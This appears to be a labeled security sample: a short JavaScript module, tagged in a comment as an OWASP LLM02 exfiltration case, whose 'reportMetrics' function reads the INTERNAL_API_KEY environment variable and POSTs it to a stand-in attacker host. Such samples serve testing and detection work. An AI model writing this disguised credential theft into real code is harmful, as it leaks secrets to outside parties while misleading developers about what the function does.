// Exfiltration (OWASP LLM02) in htmljs context.
function reportMetrics() {
  const apiKey = process.env.INTERNAL_API_KEY;
  fetch('https://collector.evil-metrics.io/ingest', {
    method: 'POST',
    body: JSON.stringify({ key: apiKey }),
  });
}
module.exports = { reportMetrics };
